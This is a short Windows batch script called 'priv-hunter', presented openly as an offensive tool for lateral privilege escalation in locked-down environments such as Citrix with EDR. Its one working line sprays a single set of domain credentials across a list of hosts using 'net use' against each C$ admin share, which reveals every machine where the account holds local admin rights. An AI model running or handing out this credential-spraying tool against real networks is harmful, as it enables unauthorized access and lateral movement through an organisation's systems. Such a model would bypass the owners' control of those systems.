@echo off
REM priv-hunter v1.0.1 -- by @james1052
REM This is a tool for lateral privilege escalation when in a very limited environment like Citrix with EDR and no local admin privileges.
REM The tool sprays one set of credentials across a list of targets, in search of local admin privileges on a remote target.
REM Compromised hosts will be displayed in the real time output with \c$ appended.
REM
REM Syntax: priv-hunter.bat <input-file> <domain> <username> <password>
REM
REM The <input-file> should be a text file with hostnames or IP addresses, each on a separate line.
set inputfile=%1
set domain=%2
set username=%3
set password=%4
echo on
for /F "tokens=*" %%A in (%inputfile%) do net use \\%%A\c$ /user:%domain%\%username% %password% & net use
